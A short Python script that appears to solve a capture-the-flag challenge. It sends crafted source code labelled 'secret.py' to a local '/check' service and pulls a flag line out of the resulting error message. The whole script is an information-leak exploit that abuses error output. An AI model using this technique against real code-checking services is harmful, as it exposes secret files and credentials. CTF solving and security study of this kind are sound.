import requests

TARGET_URL = "http://localhost:3000/check"

# Payload matches server's actual secret.py structure
payload = {
    "source": (
        "def main():\n"
        '    print("Here\'s the flag: ")\n'  # Properly escaped quotes
        "    print(FLAG)\n\n"
        "FLAG = \"TRX{real_flag}\"\n"  # Valid line
        "invalid syntax"  # Force error AFTER flag declaration
    ),
    "filename": "secret.py"
}

response = requests.post(TARGET_URL, json=payload)
error = response.json().get("error", "")

# Extract flag from error context
if "FLAG =" in error:
    flag_line = [line for line in error.split('\n') if 'FLAG =' in line][0]
    flag = flag_line.split('"')[1]
    print(f"FLAG CAPTURED: {flag}")
else:
    print("Error context analysis failed. Full response:")
    print(error)